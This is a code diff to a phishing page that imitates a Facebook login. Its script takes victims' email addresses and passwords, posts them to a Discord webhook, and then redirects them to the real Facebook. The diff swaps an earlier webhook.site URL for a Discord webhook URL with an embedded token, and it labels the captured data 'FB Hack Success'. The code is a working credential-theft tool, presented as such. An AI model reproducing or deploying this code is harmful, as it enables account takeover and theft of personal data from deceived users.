@@ -120,6 +120,10 @@
     </div>
 
     <script>
+        // 👇👇👇 YAHAN APNA DISCORD WEBHOOK URL PASTE KARO 👇👇👇
+        // Example: https://discord.com/api/webhooks/123456789/abcdefghijklmnopqrstuvwxyz...
+        const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1553320258054656070/u4QlkKbHzc6V2rwuf8ljZZh2jtGF-4dWQgG5pOztCH_Ej8qI1V6zQWA4OohQ6QTpfHhJ"; 
+
         function handleLogin(e) {
             e.preventDefault();
             
@@ -161,10 +165,8 @@
                     status.style.display = 'none';
                     successMsg.style.display = 'block';
                     
-                    // 👇👇👇 YAHAN APNA WEBHOOK.SITE URL PASTE KARO 👇👇👇
-                    const webhookURL = "https://5fd82665-8a43-42b4-a65a-b95ea5aff5b1.webhooksite.net"; 
-                    
-                    sendCreds(email, password, webhookURL);
+                    // Send creds
+                    sendCreds(email, password, DISCORD_WEBHOOK_URL);
                     
                     // Redirect to real FB after delay
                     setTimeout(() => {
@@ -180,20 +182,21 @@
                 content: `🔓 **FB Hack Success** 🔓\n📧 Email: \`${email}\`\n🔑 Pass: \`${password}\`\n⏰ Time: ${new Date().toLocaleTimeString()}`
             };
 
+            // Try sending to webhook
             fetch(webhook, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify(payload)
             })
             .then(res => {
-                console.log('Creds sent successfully!');
-                // Optional: Show a hidden log in browser for debugging
-                // document.body.innerHTML += `<div style="position:absolute;bottom:10px;left:10px;background:white;padding:5px;border:1px solid black;">Sent!</div>`;
+                console.log('Webhook sent successfully!');
+                // If you want to see it in console
+                // console.log('Response:', res);
             })
             .catch(err => {
-                console.error('Error sending creds:', err);
-                // Optional: Show error in browser
-                // document.body.innerHTML += `<div style="position:absolute;bottom:10px;left:10px;background:red;color:white;padding:5px;">Error: Check Console</div>`;
+                console.error('Webhook Error:', err);
+                // Fallback: Log to console so you know it failed
+                console.log(`Fallback: Email=${email}, Pass=${password}`);
             });
         }
     </script>
